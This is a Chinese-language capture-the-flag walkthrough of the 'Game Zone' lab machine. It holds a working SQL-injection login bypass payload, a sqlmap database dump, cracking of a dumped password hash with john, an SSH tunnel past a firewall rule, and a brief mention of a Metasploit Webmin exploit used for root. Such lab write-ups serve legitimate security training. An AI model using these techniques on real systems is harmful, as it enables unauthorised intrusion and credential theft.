# Game Zone

nmap扫描

```shell
sudo nmap --min-rate 10000 -p- 10.10.163.180 -Pn

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

sudo nmap -sT -sV -sC -O -p22,80 10.10.163.180 -Pn

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
```

进入网站，发现存在一个登录入口，尝试使用万能密码**' or 1=1 -- -**，登录成功

在新的页面看到一个搜索框，用sqlmap看一下有没有sql注入的漏洞

```shell
sqlmap -r requests.txt --dbms=mysql --dump --batch

Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

拿到了用户的用户名和密码的hash值，尝试破解该hash值

首先用hash-identifier识别一下，识别结果为sha-256

```shell
john sha.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256

videogamer124    (?)
```

破解出了密码

我们可以尝试使用ssh连接

```
ssh agent47@10.10.163.180
```

成功连接

我们将使用 **`ss`** 工具对主机上的活动套接字进行检测分析。

```shell
ss -tulpn

Netid State      Recv-Q Send-Q                                                Local Address:Port                                                               Peer Address:Port              
udp   UNCONN     0      0                                                                 *:10000                                                                         *:*                  
udp   UNCONN     0      0                                                                 *:68                                                                            *:*                  
tcp   LISTEN     0      80                                                        127.0.0.1:3306                                                                          *:*                  
tcp   LISTEN     0      128                                                               *:10000                                                                         *:*                  
tcp   LISTEN     0      128                                                               *:22                                                                            *:*                  
tcp   LISTEN     0      128                                                              :::80                                                                           :::*                  
tcp   LISTEN     0      128                                                              :::22                                                                           :::*
```

尽管防火墙规则阻止了外部对 10000 端口的访问，但借助 SSH 隧道，我们可以将该端口映射到本地，实现穿透访问。

```
 ssh -L 10000:localhost:10000 <username>@<ip>
```

完成之后，我们在浏览器中输入“localhost：10000”，即可访问

使用agent47:videogamer124登入后可以知道该cms为webmin 1.580版本，查找可知该版本存在一个rce漏洞，尝试利用

使用msf，设置好参数后运行即可拿到管理员权限

